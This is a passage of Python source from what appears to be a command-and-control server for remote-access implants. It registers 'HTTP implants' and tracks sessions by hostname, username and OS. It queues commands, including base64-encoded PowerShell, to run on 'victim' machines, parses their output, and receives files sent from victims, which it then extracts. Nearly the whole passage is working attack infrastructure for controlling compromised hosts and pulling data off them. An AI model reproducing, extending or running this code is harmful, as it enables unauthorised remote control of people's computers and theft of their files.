            bar = "█" * filled + "░" * (bar_width - filled)
            compact_filename = self.filename[:15] + "..." if len(self.filename) > 15 else self.filename
            progress_line = (
                f"\r[{self.transfer_type.upper()}] {compact_filename} | "
                f"[{bar}] {info['percentage']:.1f}% | "
                f"{info['transferred_size']:.1f}{info['size_unit']}/{info['total_size']:.1f}{info['size_unit']} | "
                f"{info['speed']:.1f}{info['speed_unit']}"
            )
            
            # Put timing info on next line for very narrow terminals
            timing_part = f" | ETA: {info['eta']} | Elapsed: {info['elapsed']}"
            if not hasattr(self, '_timing_info'):
                self._timing_info = ""
            self._timing_info = timing_part
        
        # Ensure the line never exceeds terminal width - use aggressive truncation
        if len(progress_line) > terminal_width:
            # Calculate how much space we have for the filename
            fixed_parts = f"[{self.transfer_type.upper()}] ... | [{bar}] {info['percentage']:.1f}% | {info['transferred_size']:.1f}{info['size_unit']}/{info['total_size']:.1f}{info['size_unit']} | {info['speed']:.1f}{info['speed_unit']}"
            available_for_filename = terminal_width - len(fixed_parts) - 10  # 10 chars buffer
            
            if available_for_filename > 5:
                # Use available space for filename
                filename_part = self.filename[:available_for_filename-3] + "..." if len(self.filename) > available_for_filename else self.filename
                progress_line = f"\r[{self.transfer_type.upper()}] {filename_part} | [{bar}] {info['percentage']:.1f}% | {info['transferred_size']:.1f}{info['size_unit']}/{info['total_size']:.1f}{info['size_unit']} | {info['speed']:.1f}{info['speed_unit']}"
            else:
                # Last resort - minimal display
                progress_line = f"\r[{self.transfer_type.upper()}] {self.filename[:3]}... | [{bar}] {info['percentage']:.1f}%"
            
            # Final safety check - if still too long, truncate more aggressively
            if len(progress_line) > terminal_width:
                progress_line = f"\r[{self.transfer_type.upper()}] ... | [{bar}] {info['percentage']:.1f}%"
        
        # Always update progress display - ensure we overwrite the previous line
        # Clear the line first, then write the new progress
        sys.stdout.write('\r' + ' ' * terminal_width + '\r')  # Clear the entire line
        sys.stdout.write(progress_line)
        sys.stdout.flush()
        self._last_display_line = progress_line
        
        # If we have timing info on a separate line, display it
        if hasattr(self, '_timing_info') and self._timing_info:
            sys.stdout.write(self._timing_info)
            sys.stdout.flush()
    
    def complete(self):
        """Mark transfer as completed"""
        with self.lock:
            self.completed = True
            self.bytes_transferred = self.total_size
    
    def clear_display(self):
        """Clear the progress display line"""
        try:
            import shutil
            terminal_width = shutil.get_terminal_size().columns
        except:
            terminal_width = 80
        sys.stdout.write('\r' + ' ' * terminal_width + '\r')
        sys.stdout.flush()
    
    def should_auto_complete(self, timeout_seconds: float = 2.0):
        """Check if transfer should be auto-completed due to timeout (for small files)"""
        with self.lock:
            if self.completed:
                return False
            current_time = time.time()
            # If we haven't received progress updates for more than timeout_seconds,
            # and we've been running for at least 0.5 seconds, assume it's complete
            return (current_time - self.last_progress_time > timeout_seconds and 
                    current_time - self.start_time > 0.5)
    
    def clear_display(self):
        """Clear the progress display line"""
        if hasattr(self, '_last_display_line'):
            # Clear the line by overwriting with spaces
            clear_line = "\r" + " " * len(self._last_display_line) + "\r"
            sys.stdout.write(clear_line)
            sys.stdout.flush()
            delattr(self, '_last_display_line')

# Global progress tracker
current_progress = None
progress_lock = threading.Lock()

def set_progress_tracker(progress: FileTransferProgress):
    """Set the current progress tracker"""
    global current_progress
    with progress_lock:
        current_progress = progress

def get_progress_tracker():
    """Get the current progress tracker"""
    global current_progress
    with progress_lock:
        return current_progress

def clear_progress_tracker():
    """Clear the current progress tracker"""
    global current_progress
    with progress_lock:
        if current_progress:
            current_progress.clear_display()
        current_progress = None

def process_shell_output_for_progress(text: str) -> str:
    """Process shell output to extract progress information and update progress tracker"""
    global current_progress
    
    if not current_progress:
        return text
    
    # Check if we should auto-complete due to timeout (for small files)
    if current_progress.should_auto_complete():
        current_progress.complete()
        current_progress.update(current_progress.total_size)
        # Don't display here - let the timer thread handle it
        clear_progress_tracker()
    
    lines = text.split('\n')
    filtered_lines = []
    
    for line in lines:
        # Check for curl progress lines (comprehensive filtering to hide ALL progress indicators)
        is_curl_progress = (
            # Header line
            ('Dload' in line and 'Upload' in line and 'Total' in line) or
            # Progress lines with numbers and time indicators
            (line.strip() and line.strip()[0].isdigit() and '--:--:--' in line) or
            (line.strip().startswith(' ') and line.strip()[1:2].isdigit() and '--:--:--' in line) or
            # Progress lines with file sizes
            (line.strip() and line.strip()[0].isdigit() and ('k' in line or 'M' in line) and ('--:--:--' in line or '0:00:' in line)) or
            (line.strip().startswith(' ') and line.strip()[1:2].isdigit() and ('k' in line or 'M' in line) and ('--:--:--' in line or '0:00:' in line)) or
            # Percentage-only lines (like the ones in your output)
            (line.strip() and line.strip().endswith('%') and '#' in line) or
            # Lines with just # characters
            (line.strip() and all(c in '# ' for c in line.strip())) or
            # Lines that start with spaces and contain only # characters and spaces
            (line.strip().startswith(' ') and all(c in '# ' for c in line.strip())) or
            # Lines that are just # characters with spaces
            (line.strip() and '#' in line and all(c in '# ' for c in line.strip())) or
            # Lines with percentage followed by # characters
            (line.strip() and '%' in line and '#' in line and any(c.isdigit() for c in line.strip())) or
            # Additional patterns to catch all percentage displays
            (line.strip() and '%' in line and any(c.isdigit() for c in line.strip()) and len(line.strip()) < 20) or
            # Lines that are just percentages with spaces
            (line.strip() and line.strip().replace(' ', '').replace('%', '').replace('.', '').isdigit()) or
            # Lines with hash symbols and percentages
            ('#' in line and '%' in line) or
            # Lines that are mostly hash symbols
            (line.strip() and line.count('#') > 10) or
            # Lines with percentage and spaces (like "15.5%")
            (line.strip() and '%' in line and line.strip().replace('%', '').replace('.', '').replace(' ', '').isdigit()) or
            # Lines that start with percentage
            (line.strip() and line.strip()[0].isdigit() and '%' in line) or
            # Lines that are just numbers and percentage
            (line.strip() and line.strip().replace('%', '').replace('.', '').replace(' ', '').isdigit() and '%' in line)
        )
        
        if is_curl_progress:
            # Try to extract progress information from curl output
            try:
                parts = line.strip().split()
                if len(parts) >= 7 and parts[0].isdigit() and parts[1].isdigit():
                    # Format: % Total Received Xferd Average Speed Time Time Time Current
                    total = int(parts[1])
                    received = int(parts[2])
                    if total > 0:
                        current_progress.update(received)
                        # Don't display here - let the main progress display handle it
                elif line.strip().endswith('%') and '#' in line:
                    # Handle percentage-only lines like "1.3%##########"
                    try:
                        # Quick percentage extraction - avoid regex for performance
                        line_clean = line.strip()
                        if '%' in line_clean:
                            percentage_part = line_clean.split('%')[0]
                            # Simple number extraction from the end
                            percentage_str = ''.join(c for c in percentage_part if c.isdigit() or c == '.')
                            if percentage_str:
                                percentage = float(percentage_str)
                                if 0 <= percentage <= 100:
                                    # Estimate bytes based on percentage
                                    estimated_bytes = int((percentage / 100) * current_progress.total_size)
                                    current_progress.update(estimated_bytes)
                                    # Don't display here - throttling handles it
                    except (ValueError, IndexError):
                        pass
                elif line.strip() and all(c in '# ' for c in line.strip()) and '#' in line:
                    # Handle lines that are just # characters (like "######################################################################## 100.0%")
                    # This indicates 100% completion
                    if current_progress:
                        current_progress.complete()
                        current_progress.update(current_progress.total_size)
                        # Don't display here - let the timer thread handle it
                        clear_progress_tracker()
                        continue
            except (ValueError, IndexError):
                pass
            
            # Don't include curl progress lines in output
            continue
        
        # Check for PowerShell progress indicators
        if 'ProgressPreference' in line or 'Invoke-WebRequest' in line:
            # These are PowerShell progress lines, don't show them
            continue
            
        # Check for completion messages
        if any(completion_msg in line for completion_msg in [
            'File uploaded successfully',
            'Directory extracted successfully',
            'Directory transfer completed',
            'Archive downloaded successfully'
        ]):
            if current_progress:
                # Ensure progress bar shows 100% completion
                current_progress.complete()
                # Force a final update to show 100% completion
                current_progress.update(current_progress.total_size)
                # Don't display here - let the timer thread handle it
                clear_progress_tracker()
                # Don't include completion messages in output to avoid duplication
                continue
        
        filtered_lines.append(line)
    
    return '\n'.join(filtered_lines)

def check_local_file_exists(file_path: str) -> tuple[bool, bool, str]:
    """
    Check if local file or folder exists
    Returns: (exists, is_directory, error_message)
    """
    try:
        if os.path.isfile(file_path):
            return True, False, ""
        elif os.path.isdir(file_path):
            return True, True, ""
        else:
            return False, False, f"File or folder '{file_path}' does not exist"
    except Exception as e:
        return False, False, f"Error checking file existence: {str(e)}"

def shell_execute_and_get_output(shell_id: str, command: str, timeout: int = 5) -> str:
    """Execute a command in a shell session and return its output.
    Handles non-blocking sockets and command echoing.
    """
    with global_lock:
        if shell_id not in shell_sessions:
            return ""
        shell_socket = shell_sessions[shell_id]['socket']
    
    try:
        # Clear any pending data first
        while True:
            try:
                ready, _, _ = select([shell_socket], [], [], 0.05)
                if ready:
                    shell_socket.recv(4096)
                else:
                    break
            except (BlockingIOError, Exception):
                break

        # Send command
        shell_socket.sendall((command + '\n').encode())
        
        # Read response
        start_time = time.time()
        response_data = ""
        while time.time() - start_time < timeout:
            try:
                ready, _, _ = select([shell_socket], [], [], 0.1)
                if ready:
                    data = shell_socket.recv(8192)
                    if not data:
                        break
                    chunk = data.decode(errors='ignore')
                    response_data += chunk
                    
                    # Heuristic: stop reading if we find markers we care about (CWD:, EXISTS_, etc.)
                    # But we don't know the caller's markers, so we just capture for the full timeout
                    # or until a reasonable "end of output" pattern is seen (like a new prompt)
                    # For now, let's just use the timeout/select approach
                else:
                    # If we already have data and select timed out, we might have the full response
                    if response_data:
                        break
            except BlockingIOError:
                time.sleep(0.1)
                continue
            except Exception:
                break
        
        # Clean up output: strip the echoed command if it's at the start
        clean_out = response_data.replace(command, '', 1).strip()
        return clean_out
    except Exception:
        return ""

def check_remote_file_exists(session_id: str, session_type: str, filename: str, cwd: str = None) -> tuple[bool, bool, str]:
    """
    Check if file or folder exists on victim's machine
    Returns: (exists, is_directory, error_message)
    """
    try:
        os_choice = 'Linux'
        if session_type == 'http':
            with global_lock:
                if session_id not in http_sessions:
                    return False, False, "HTTP session not found"
                os_choice = http_sessions[session_id].get('os', 'Linux')
        elif session_type == 'shell':
            with global_lock:
                if session_id not in shell_sessions:
                    return False, False, "Shell session not found"
                os_choice = shell_sessions[session_id].get('os', 'Linux')
        else:
            return False, False, "Unknown session type"

        # Generate OS-specific file existence check command
        if os_choice == 'Windows':
            # Escape single quotes for PowerShell
            escaped_filename = filename.replace("'", "''")
            ps_script = f"if (Test-Path -LiteralPath '{escaped_filename}') {{ if ((Get-Item -LiteralPath '{escaped_filename}').PSIsContainer) {{ Write-Output 'EXISTS_DIRECTORY' }} else {{ Write-Output 'EXISTS_FILE' }} }} else {{ Write-Output 'NOT_EXISTS' }}"
            ps_bytes = ps_script.encode('utf-16le')
            b64 = base64.b64encode(ps_bytes).decode('ascii')
            check_cmd = f"powershell -NoProfile -NonInteractive -EncodedCommand {b64}"
        else:
            # Use shlex.quote for robust shell argument handling on Linux
            quoted_filename = shlex.quote(filename)
            check_cmd = f'test -f {quoted_filename} && echo "EXISTS_FILE" || (test -d {quoted_filename} && echo "EXISTS_DIRECTORY" || echo "NOT_EXISTS")'

        quiet_print(f"[*] Checking if '{filename}' exists on victim...")
        quiet_print(f"[DEBUG] Existence check command: {check_cmd}")

        if session_type == 'http':
            # Send command via HTTP
            with global_lock:
                http_sessions[session_id]['last_cmd'] = check_cmd
                http_sessions[session_id]['has_new_output'] = False
                http_sessions[session_id]['awaiting'] = True
                http_sessions[session_id]['state'] = "busy"

            # Wait for response
            wait_for_http_response(session_id, 5)
            
            with global_lock:
                session = http_sessions.get(session_id)
                if not session:
                    return False, False, "Session not found after command execution"
                output = session.get('output', '').strip()
        else:
            # Use interactive-safe active execute
            output = shell_execute_and_get_output(session_id, check_cmd, timeout=4)
        
        quiet_print(f"[DEBUG] Existence check response: '{output}'")
        
        if 'EXISTS_FILE' in output:
            return True, False, ""
        elif 'EXISTS_DIRECTORY' in output:
            return True, True, ""
        elif 'NOT_EXISTS' in output:
            return False, False, f"File or folder '{filename}' does not exist on victim"
        
        # Check for error patterns if markers weren't found
        if any(error in output.lower() for error in ['error', 'not found', 'no such file', 'cannot find']):
            return False, False, f"File or folder '{filename}' does not exist on victim"
        
        return False, False, f"File or folder '{filename}' does not exist on victim (timeout)"

    except Exception as e:
        return False, False, f"Error checking file existence: {str(e)}"

def calculate_file_size(file_path: str) -> int:
    """Calculate file size - self-contained function"""
    try:
        if os.path.isfile(file_path):
            return os.path.getsize(file_path)
        elif os.path.isdir(file_path):
            total_size = 0
            for dirpath, dirnames, filenames in os.walk(file_path):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    try:
                        total_size += os.path.getsize(filepath)
                    except (OSError, FileNotFoundError):
                        continue
            return total_size
        else:
            return 0
    except Exception:
        return 0

def get_file_size_commands(file_path: str, os_choice: str) -> str:
    """Generate commands to get file/folder size on victim machine - self-contained function"""
    if os_choice == 'Windows':
        # Escape single quotes for PowerShell
        escaped_path = file_path.replace("'", "''")
        return f"""
$size = 0
if (Test-Path '{escaped_path}' -PathType Leaf) {{
    $size = (Get-Item '{escaped_path}').Length
    Write-Output "FILE_SIZE:$size"
}} elseif (Test-Path '{escaped_path}' -PathType Container) {{
    $size = (Get-ChildItem -Path '{escaped_path}' -Recurse -File | Measure-Object -Property Length -Sum).Sum
    if ($size -eq $null) {{ $size = 0 }}
    Write-Output "FOLDER_SIZE:$size"
}} else {{
    Write-Output "FILE_SIZE:0"
}}
""".strip()
    else:  # Linux
        # Use shlex.quote for robust shell argument handling
        quoted_path = shlex.quote(file_path)
        # Smart detection: try file first, then folder, with appropriate prefixes
        return f"if [ -f {quoted_path} ]; then stat -c%s {quoted_path} 2>/dev/null | sed 's/^/FILE_SIZE:/'; elif [ -d {quoted_path} ]; then du -sb {quoted_path} 2>/dev/null | cut -f1 | sed 's/^/FOLDER_SIZE:/'; else echo 'FILE_SIZE:0'; fi"

class C2Handler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def do_GET(self):
        uid = self.headers.get("Authorization")
        if not uid:
            return
        path = self.path.strip("/")
        with global_lock:
            # Handle terminated sessions explicitly (tombstone for 30 seconds)
            if uid in TERMINATED_SESSIONS:
                last_term = TERMINATED_SESSIONS[uid]
                if time.time() - last_term < 30:
                    self._set_headers()
                    self.wfile.write(b"exit\n")
                    return
                else:
                    del TERMINATED_SESSIONS[uid]

            if uid not in http_sessions:
                http_sessions[uid] = {
                    "last_cmd": "", 
                    "last_sent": "", 
                    "output": "", 
                    "last_seen": time.time(), 
                    "last_activity": time.time(),
                    "cwd": None, 
                    "has_new_output": False, 
                    "awaiting": False, 
                    "state": "idle",
                    "command_sent_time": 0,
                    "os": None,
                    # Villain-style stability tracking
                    "status": "unknown",
                    "stability_score": 0.5,
                    "successful_commands": 0,
                    "total_commands": 0,
                    "consecutive_failures": 0,
                    "command_queue": [],
                    "hostname": None,
                    "username": None,
                    "was_file_transfer": False,
                    "listener_port": self.server.server_address[1],
                    "detection_complete": False  # Track background detection
                }
                # Only show "new implant" message if not currently in a file transfer
                if not any(session.get("state") == "file_transfer" for session in http_sessions.values()):
                    sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                else:
                    sys.stdout.write(f"\r[+] HTTP implant reconnected: {uid}\nC2 > ")
                sys.stdout.flush()
                
                # Start background detection for HTTP session
                threading.Thread(target=detect_http_session_info, args=(uid,), daemon=True).start()
            
            # Update activity tracking
            current_time = time.time()
            http_sessions[uid]["last_seen"] = current_time
            http_sessions[uid]["last_activity"] = current_time

        self._set_headers()
        parts = uid.split('-')
        if len(parts) >= 2:
            beacon_path = parts[0]
            command_fetch_path = parts[1]
            if path == command_fetch_path:
                with global_lock:
                    cmd = http_sessions[uid].get("last_cmd", "")
                    http_sessions[uid]["last_sent"] = cmd
                    http_sessions[uid]["last_sent_time"] = time.time()
                    http_sessions[uid]["command_sent_time"] = time.time()
                    http_sessions[uid]["last_cmd"] = ""
                    
                    # Set session state based on command type
                    is_file_transfer = False
                    
                    # Check for direct file transfer commands
                    if "Invoke-WebRequest" in cmd or "curl" in cmd:
                        file_transfer_keywords = ["tar", "extract", "archive", "download", "transfer", ".tar.gz", ".zip"]
                        if any(keyword in cmd.lower() for keyword in file_transfer_keywords):
                            is_file_transfer = True
                    
                    # Check for PowerShell -EncodedCommand with base64
                    elif "powershell" in cmd.lower() and "-encodedcommand" in cmd.lower():
                        # For now, assume all PowerShell encoded commands are file transfers
                        # This is a safe assumption since we only send file transfer commands this way
                        is_file_transfer = True
                        quiet_print(f"[DEBUG] Assuming PowerShell encoded command is file transfer: {cmd[:50]}...")
                        
                        # Try to decode and verify (optional)
                        try:
                            parts = cmd.split("-EncodedCommand")
                            if len(parts) > 1:
                                b64_part = parts[1].strip()
                                decoded_cmd = base64.b64decode(b64_part).decode('utf-8', errors='ignore').lower()
                                file_transfer_keywords = ["invoke-webrequest", "curl", "download", "transfer", "archive", "tar", "extract"]
                                if any(keyword in decoded_cmd for keyword in file_transfer_keywords):
                                    quiet_print(f"[DEBUG] Confirmed file transfer keywords in decoded command")
                        except:
                            pass
                    
                    # Check for direct base64 commands
                    else:
                        try:
                            decoded_cmd = base64.b64decode(cmd).decode('utf-8', errors='ignore').lower()
                            file_transfer_keywords = ["invoke-webrequest", "curl", "download", "transfer", "archive", "tar", "extract"]
                            if any(keyword in decoded_cmd for keyword in file_transfer_keywords):
                                is_file_transfer = True
                        except:
                            pass
                    
                    # Set the state based on detection
                    if is_file_transfer:
                        http_sessions[uid]["state"] = "file_transfer"
                        http_sessions[uid]["was_file_transfer"] = True
                        quiet_print(f"[DEBUG] Detected file transfer command for {uid}: {cmd[:50]}...")
                    else:
                        http_sessions[uid]["state"] = "busy"
                self.wfile.write((cmd + "\n").encode())
                return
            elif path == beacon_path:
                self.wfile.write(b"")
                return
        self.wfile.write(b"None")

    def do_POST(self):
        uid = self.headers.get("Authorization")
        if not uid:
            return
        length = int(self.headers.get("Content-Length", 0))
        raw_data = self.rfile.read(length).decode(errors="ignore")
        # decode numeric payloads if present
        if re.fullmatch(r"(\d+\s*)+", raw_data.strip()):
            try:
                byte_values = [int(b) for b in raw_data.strip().split()]
                decoded_output = bytes(byte_values).decode("utf-8", errors="ignore")
            except Exception:
                decoded_output = raw_data
        else:
            decoded_output = raw_data

        with global_lock:
            if uid in http_sessions:
                http_sessions[uid]["output"] = decoded_output
                current_time = time.time()
                http_sessions[uid]["last_seen"] = current_time
                http_sessions[uid]["last_activity"] = current_time
                http_sessions[uid]["has_new_output"] = True
                http_sessions[uid]["awaiting"] = False  # Clear awaiting flag for background logic
                
                # Implicit detection for Windows User (DOMAIN\User)
                if decoded_output and '\\' in decoded_output and len(decoded_output.strip().split()) == 1 and '/' not in decoded_output:
                    candidate = decoded_output.strip()
                    if len(candidate) < 50 and not any(c in '<>:"|?*' for c in candidate):
                        http_sessions[uid]["username"] = candidate
                        if not http_sessions[uid].get(" os"):
                            http_sessions[uid]["os"] = "Windows"
                
                # Explicit WHOAMI parsing (handles echoed commands)
                if http_sessions[uid].get("last_sent") == "whoami":
                    candidate = decoded_output.strip()
                    # Strip echoed command if present
                    if candidate.lower().startswith("whoami"):
                        candidate = candidate[6:].strip()
                    
                    if candidate and len(candidate) < 50:
                        username_parts = candidate.split('\n')
                        final_candidate = username_parts[0].strip()
                        if final_candidate:
                            http_sessions[uid]["username"] = final_candidate
                            if '\\' in final_candidate:
                                http_sessions[uid]["os"] = "Windows"

                # Reset state to idle when we receive output (command completed)
                http_sessions[uid]["state"] = "idle"
                http_sessions[uid]["was_file_transfer"] = False
                
                # Update session stability (command completed successfully)
                update_session_stability(uid, True)
                # Prefer explicit CWD marker if present, else use heuristics
                clean = (decoded_output or "").strip()
                # Marker form: CWD:<absolute_path>
                marker_lines = [ln.strip() for ln in clean.splitlines() if ln.strip().startswith("CWD:")]
                if marker_lines:
                    try:
                        last_marker = marker_lines[-1]
                        _, path_val = last_marker.split(":", 1)
                        http_sessions[uid]["cwd"] = path_val.strip()
                    except Exception:
                        pass
                
                # Check for USER marker
                user_marker_lines = [ln.strip() for ln in clean.splitlines() if ln.strip().startswith("USER:")]
                if user_marker_lines:
                    try:
                        last_user = user_marker_lines[-1]
                        _, user_val = last_user.split(":", 1)
                        http_sessions[uid]["username"] = user_val.strip()
                    except Exception:
                        pass
                
                # Check for OS marker
                os_marker_lines = [ln.strip() for ln in clean.splitlines() if ln.strip().startswith("OS:")]
                if os_marker_lines:
                    try:
                        last_os = os_marker_lines[-1]
                        _, os_val = last_os.split(":", 1)
                        os_name = os_val.strip()
                        if os_name.lower().startswith("win"):
                            http_sessions[uid]["os"] = "Windows"
                        elif "linux" in os_name.lower():
                            http_sessions[uid]["os"] = "Linux"
                        else:
                            http_sessions[uid]["os"] = os_name
                    except Exception:
                        pass
                elif not marker_lines:
                    last_sent = http_sessions[uid].get("last_sent", "")
                    if "Get-Location" in last_sent or last_sent.strip().lower() == "pwd":
                        lines = [ln for ln in clean.splitlines() if ln.strip()]
                        if lines:
                            candidate = lines[-1].strip()
                            if re.match(r"^[A-Za-z]:\\", candidate) or candidate.startswith("\\") or candidate.startswith("/"):
                                http_sessions[uid]["cwd"] = candidate

                # Infer and remember OS for this session
                cwd_val = http_sessions[uid].get("cwd")
                if cwd_val:
                    if re.match(r"^[A-Za-z]:\\", cwd_val) or "\\" in cwd_val:
                        http_sessions[uid]["os"] = "Windows"
                    elif cwd_val.startswith("/"):
                        http_sessions[uid]["os"] = "Linux"
                else:
                    # Heuristic: PowerShell outputs often include 'Directory:' or 'Mode  LastWriteTime'
                    if re.search(r"\bDirectory:\b|\bMode\s+LastWriteTime\b", clean):
                        http_sessions[uid]["os"] = "Windows"

        self._set_headers()
        self.wfile.write(b"")

    def log_message(self, format, *args):
        return


class FileUploadHandler(http.server.BaseHTTPRequestHandler):
    """Handler for receiving files from victims"""
    def do_POST(self):
        try:
            quiet_print(f"[DEBUG] Received POST request to: {self.path}")
            quiet_print(f"[DEBUG] Headers: {dict(self.headers)}")
            content_length = int(self.headers.get('Content-Length', 0))
            quiet_print(f"[DEBUG] Content-Length: {content_length}")
            
            # Read data with progress tracking
            post_data = b""
            bytes_read = 0
            chunk_size = 16384  # Read in 16KB chunks for better performance
            
            # Get progress tracker before starting the read loop
            progress = get_progress_tracker()
            
            # If we have a progress tracker but the total size is unknown (1 byte), update it with content length
            if progress and progress.total_size == 1 and content_length > 0:
                progress.total_size = content_length
                quiet_print(f"[DEBUG] Updated progress tracker with content length: {content_length}")
            
            while bytes_read < content_length:
                remaining = content_length - bytes_read
                read_size = min(chunk_size, remaining)
                chunk = self.rfile.read(read_size)
                if not chunk:
                    break
                post_data += chunk
                bytes_read += len(chunk)
                
                # Update progress - throttled display to prevent performance issues
                if progress:
                    progress.update(bytes_read)
                    # Only display progress every 32KB to avoid performance issues
                    if bytes_read % 32768 == 0 or bytes_read >= content_length:
                        progress.display_progress()
            
            # Mark as complete when all data is read
            if bytes_read >= content_length and progress:
                progress.complete()
                progress.display_progress(force_show=True)
                print()  # New line after progress
                clear_progress_tracker()
            
            quiet_print(f"[DEBUG] Read {len(post_data)} bytes of data")
            
            # Extract the filename from the URL query parameter
            query = urlparse(self.path).query
            query_components = dict(qc.split("=") for qc in query.split("&") if "=" in qc)
            
            # Get filename from query parameter
            if 'filename' in query_components:
                filename = unquote(query_components['filename'])
                # Extract just the basename for security
                filename = os.path.basename(filename)
            else:
                filename = 'received_file'
            
            # Get archive type and add proper extension
            archive_type = query_components.get('type', '')
            if archive_type == 'tar.gz' and not filename.endswith('.tar.gz'):
                filename = filename + '.tar.gz'
            elif archive_type == 'zip' and not filename.endswith('.zip'):
                filename = filename + '.zip'
            
            # Check if this is a compressed archive
            archive_type = query_components.get('type', '')
            
            # Check if there's a custom save path for this session
            # We need to find which session this might be from by checking recent sessions
            custom_save_path = None
            with global_lock:
                # Find the most recent session that has a custom save path
                for uid, session in http_sessions.items():
                    if 'custom_save_path' in session:
                        custom_save_path = session.get('custom_save_path')
                        # Clear it after use
                        if 'custom_save_path' in session:
                            del session['custom_save_path']
                        break
            
            if custom_save_path:
                filepath = custom_save_path
            else:
                # If a pending global save path exists (e.g., from a TCP session), use it once
                global pending_upload_save_path
                with global_lock:
                    take_pending = pending_upload_save_path
                    pending_upload_save_path = None
                if take_pending:
                    filepath = take_pending
                else:
                    # Default to download directory (for receiving files from victims)
                    filepath = os.path.join(DOWNLOAD_DIR, filename)
            
            # Update filepath to include the proper extension based on archive type
            if archive_type == 'tar.gz' and not filepath.endswith('.tar.gz'):
                filepath = filepath + '.tar.gz'
            elif archive_type == 'zip' and not filepath.endswith('.zip'):
                filepath = filepath + '.zip'
            
            # Ensure we don't overwrite existing files
            counter = 1
            original_filepath = filepath
            while os.path.exists(filepath):
                name, ext = os.path.splitext(original_filepath)
                filepath = f"{name}_{counter}{ext}"
                counter += 1
            
            # Save bytes exactly as received (no auto-conversion)
            try:
                with open(filepath, 'wb') as f:
                    f.write(post_data)
                quiet_print(f"[DEBUG] File saved successfully to: {filepath}")
                
                # Complete progress tracking
                progress = get_progress_tracker()
                if progress:
                    progress.complete()
                    progress.display_progress(force_show=True)
                    print()  # New line after progress
                    clear_progress_tracker()
                    
            except Exception as e:
                quiet_print(f"[DEBUG] Error saving file: {e}")
                clear_progress_tracker()
                raise
            
            # Check if it's a compressed archive and extract it
            extracted_path = None
            quiet_print(f"[DEBUG] Upload handler - filename: {filename}, filepath: {filepath}, archive_type: {archive_type}")
            quiet_print(f"[DEBUG] POST data size: {len(post_data)} bytes")
            quiet_print(f"[DEBUG] Query components: {query_components}")  # Debug output
            
            if archive_type == 'zip' or filename.endswith('.zip'):
                try:
                    import zipfile
                    # For ZIP files, extract to a directory with the same name (without .zip extension)
                    if filename.endswith('.zip'):
                        extract_dir = os.path.join(os.path.dirname(filepath), filename[:-4])
                        zip_file_path = filepath  # filepath already has .zip extension
                    else:
                        extract_dir = filepath
                        zip_file_path = filepath + '.zip'  # Add .zip extension
                    quiet_print(f"[DEBUG] Extracting ZIP to: {extract_dir}")  # Debug output
                    quiet_print(f"[DEBUG] ZIP file path: {zip_file_path}")  # Debug output
                    
                    # Remove existing file/directory if it exists
                    if os.path.exists(extract_dir):
                        import shutil
                        if os.path.isfile(extract_dir):
                            os.remove(extract_dir)
                        else:
                            shutil.rmtree(extract_dir)
                    
                    # Create the extraction directory
                    os.makedirs(extract_dir, exist_ok=True)
                    
                    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
                        for member in zip_ref.infolist():
                            # Convert Windows paths to Unix paths
                            member.filename = member.filename.replace('\\', '/')
                            # Extract each file individually to handle path conversion
                            zip_ref.extract(member, extract_dir)
                    
                    extracted_path = extract_dir
                    # Remove the zip file after extraction
                    os.remove(zip_file_path)
                    sys.stdout.write(f"\r[+] Directory extracted from {os.path.basename(zip_file_path)} -> {extract_dir}\nC2 > ")
                except Exception as e:
                    sys.stdout.write(f"\r[+] File received from victim: {os.path.basename(filepath)} -> {filepath} (extraction failed: {e})\nC2 > ")
            elif archive_type == 'tar.gz' or filename.endswith('.tar.gz'):
                try:
                    import tarfile
                    # For tar.gz files, extract directly to the parent directory to avoid nested structure
                    if filename.endswith('.tar.gz'):
                        # Extract to the same directory as the tar file, not into a subdirectory
                        extract_dir = os.path.dirname(filepath)
                        tar_file_path = filepath  # filepath already has .tar.gz extension
                    else:
                        extract_dir = os.path.dirname(filepath)
                        tar_file_path = filepath + '.tar.gz'  # Add .tar.gz extension
                    
                    # CRITICAL FIX: Ensure tar_file_path points to the actual TAR file
                    if not tar_file_path.endswith('.tar.gz'):
                        tar_file_path = tar_file_path + '.tar.gz'
                    
                    quiet_print(f"[DEBUG] Extracting TAR.GZ to: {extract_dir}")  # Debug output
                    quiet_print(f"[DEBUG] TAR file path: {tar_file_path}")  # Debug output
                    quiet_print(f"[DEBUG] TAR file exists: {os.path.exists(tar_file_path)}")  # Debug output
                    quiet_print(f"[DEBUG] TAR file size: {os.path.getsize(tar_file_path) if os.path.exists(tar_file_path) else 'N/A'}")  # Debug output
                    
                    # List contents of tar file before extraction
                    with tarfile.open(tar_file_path, 'r:gz') as tar_ref:
                        members = tar_ref.getmembers()
                        quiet_print(f"[DEBUG] TAR file contains {len(members)} items:")  # Debug output
                        for member in members[:10]:  # Show first 10 items
                            quiet_print(f"[DEBUG]   - {member.name} ({'dir' if member.isdir() else 'file'})")  # Debug output
                        if len(members) > 10:
                            quiet_print(f"[DEBUG]   ... and {len(members) - 10} more items")  # Debug output
                        
                        # Extract all files directly to the parent directory
                        tar_ref.extractall(extract_dir, filter='data')
                        quiet_print(f"[DEBUG] Extraction completed to: {extract_dir}")  # Debug output
                    
                    # Verify extraction by listing contents
                    if os.path.exists(extract_dir):
                        extracted_items = []
                        for root, dirs, files in os.walk(extract_dir):
                            for d in dirs:
                                extracted_items.append(os.path.join(root, d))
                            for f in files:
                                extracted_items.append(os.path.join(root, f))
                        quiet_print(f"[DEBUG] Extracted {len(extracted_items)} items:")  # Debug output
                        for item in extracted_items[:10]:  # Show first 10 items
                            quiet_print(f"[DEBUG]   - {item}")  # Debug output
                        if len(extracted_items) > 10:
                            quiet_print(f"[DEBUG]   ... and {len(extracted_items) - 10} more items")  # Debug output
                    
                    # Remove the tar.gz file after extraction
                    os.remove(tar_file_path)
                    sys.stdout.write(f"\r[+] Directory extracted from {os.path.basename(tar_file_path)} -> {extract_dir}\nC2 > ")
                except Exception as e:
                    import traceback
                    quiet_print(f"[DEBUG] Extraction error details: {traceback.format_exc()}")  # Debug output
                    sys.stdout.write(f"\r[+] File received from victim: {os.path.basename(filepath)} -> {filepath} (extraction failed: {e})\nC2 > ")
            else:
                # Regular file
                quiet_print(f"[DEBUG] Not a compressed archive, treating as regular file")  # Debug output
                sys.stdout.write(f"\r[+] File received from victim: {os.path.basename(filepath)} -> {filepath}\nC2 > ")
                
            self.send_response(200)
